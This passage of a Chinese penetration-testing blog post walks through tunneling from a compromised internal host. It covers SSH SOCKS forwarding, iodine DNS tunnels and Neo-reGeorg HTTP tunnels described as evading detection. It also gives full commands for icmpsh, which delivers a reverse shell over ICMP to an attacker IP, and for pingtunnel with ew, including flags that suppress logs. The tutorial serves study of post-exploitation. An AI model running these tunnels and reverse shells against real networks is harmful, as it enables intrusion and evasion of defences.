+<pre><code>ssh -N -D 8080 root@192.168.0.1</code></pre>
+<pre><code>-N 指示SSH不要启动shell，因为我们只是想创建代理
+-D 设置动态端口转发，SOCKS代理端口为8080</code></pre>
+<p>输入完VPS的ssh密码之后，就开始进行转发</p>
+<p><strong>攻击机配置proxychains代理</strong></p>
+<p><img src="/images/255.png"></p>
+<p>然后就是继续渗透了！</p>
+<h5 id="目标为Windows"><a href="#目标为Windows" class="headerlink" title="目标为Windows"></a><strong>目标为Windows</strong></h5><p>条件：同时需要安装TAP网卡驱动程序。也可以下载OpenVPN，在安装时仅选择TAP-Win32驱动程序，安装后服务器上就会多出一块“TAP-Wndows ADApter V9”的网卡。</p>
+<p><img src="/images/256.png"></p>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a></p>
+<p>运行客户端程序iodine，如果出现提示“Connection setup complete, transmitting data”，就表示DNS隧道已经建立。</p>
+<pre><code>iodine.exe -f -P d1m0n dns2tcp.xxx.com -M 200</code></pre>
+<p><img src="/images/257.png"></p>
+<p>通过在客户端执行”ping 192.168.0.1”命令，来测试连通性。</p>
+<p><strong>使用DNS隧道</strong></p>
+<p>由于客户端和服务器在同一个局域网中，只要直接访问即可。例如，登录目标主机的3389端口，就可以直接执行”rdesktop 192.168.0.2:3389”命令。同样，目标主机也可以通过SSH进行登录服务器。</p>
+<h3 id="HTTP隧道"><a href="#HTTP隧道" class="headerlink" title="HTTP隧道"></a>HTTP隧道</h3><p>通过HTTP协议与代理服务器建立连接，把所有要传送的数据全部封装到HTTP协议里进行传送。用于绕过IDS、Firewall一类的安全设备限制和只允许web服务和外界通信，可以实现端口复用的好处。常常用于内网里面的端口转发与流量代理,由于HTTP通信流量往往与正常流量差异较少一般不容易被检测出来。</p>
+<p><strong>适用环境</strong></p>
+<p>获取webshell的主机位于内网，并且该内网主机的icmp、dns、tcp和udp协议等都不能出网。</p>
+<p><strong>工具介绍</strong></p>
+<p>Neo-reGeorg,为reGeorg的升级版，且传输内容经过了base64编码，避免特征检查，有效绕过检测。(稳定性好)</p>
+<p>工具地址以及如何使用上面介绍该工具的时候已经说明了。</p>
+<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><p>ICMP隧道是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为Ping命令的回复，攻击者可以利用命令得到比回复更多的ICMP请求。在通常情况下，每个Ping命令都有相对应的回复与请求。</p>
+<p>在一些条件下，如果攻击者使用各类隧道技术（HTTP，DNS，常规正反端口转发等）操作都失败了，常常会通过ping命令访问远程计算机，尝试进行ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙（通常防火墙不会屏蔽ping数据包），实现不受限制的网络访问。</p>
+<h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><ul>
+<li>icmpsh的优点是在目标机器上运行时不需要管理员权限</li>
+<li>客户端目标只能是Windows</li>
+</ul>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
+<p><strong>服务端安装</strong></p>
+<p>需要先安装python impacket</p>
+<pre><code>git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+python2 setup.py install</code></pre>
+<p><strong>安装icmpsh</strong></p>
+<pre><code>git clone https://github.com/inquisb/icmpsh.git</code></pre>
+<p>在使用icmpsh前需要先禁用对ping的响应回复，防止内核对ping数据包进行响应，影响程序。（用完再改成0）</p>
+<pre><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></pre>
+<p><strong>服务端开启监听</strong></p>
+<pre><code>python2 icmpsh_m.py attackIP targetIP
+python2 icmpsh_m.py 192.168.80.131 192.168.80.130</code></pre>
+<p><img src="/images/258.png"></p>
+<p><strong>客户端运行</strong></p>
+<pre><code>icmpsh.exe -t attackIP
+icmpsh.exe -t 192.168.80.131</code></pre>
+<p><img src="/images/259.png"></p>
+<p><strong>接收shell</strong></p>
+<p><img src="/images/260.png"></p>
+<h4 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h4><p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+<ul>
+<li>在客户端中运行一定要加noprint nolog两个参数，否则会生成大量的日志文件</li>
+<li>客户端执行需要管理员权限</li>
+</ul>
+<p><strong>攻击机服务端执行</strong></p>
+<pre><code>./ew_for_linux64 -s rcsocks -l 1080 -e 10808</code></pre>
+<p>将10808收到的流量转发至1080端口</p>
+<p>然后执行pingtunnel</p>
+<pre><code>./pingtunnel -type server </code></pre>
+<p><strong>沦陷机器客户端执行</strong></p>
+<pre><code>pingtunnel.exe -type client -l 127.0.0.1:1080 -s 192.168.80.131 -t 192.168.80.131:10808 -sock5 -1 -noprint 1 -nolog 1</code></pre>
+<p>然后执行ew</p>
+<pre><code>ew_for_Win.exe -s rssocks -d 127.0.0.1 -e 1080</code></pre>
+<p><strong>隧道搭建成功</strong></p>
+<p><img src="/images/261.png"></p>
+<p><img src="/images/262.png"></p>
+<p>配置隧道代理进行内网渗透</p>
+<p><img src="/images/263.png"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NTU0Nzk5MQ==&mid=2247483919&idx=1&sn=abd02476fb2c90dbc0d7ac01793936ed&chksm=ce5921b7f92ea8a10b389fafb874c085d3b880341bb0566956f64bcf6782d31d35a6fe355ab5&mpshare=1&scene=23&srcid=0224YjZAuT5UGNty9otMFZgL&sharer_sharetime=1645691464210&sharer_shareid=79f27f6e56ba23e3a1134e77ab528270#rd">代理转发隧道技术</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/284740.html">内网隐藏通信隧道技术——DNS隧道</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/120030588">内网渗透之DNS隧道</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">0xEaS</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">http://example.com/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">0xEaS</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="内网渗透篇-隧道代理">
+                        
+                        <span class="card-title">内网渗透篇-隧道代理</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            0xEaS
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Thinkphp6.0.12LTS反序列化漏洞分析">
+                        
+                        <span class="card-title">Thinkphp6.0.12LTS反序列化漏洞分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            0xEaS
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">0xEaS</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/chenguangyi1/chenguangyi1.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:742917877@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=742917877" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 742917877" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
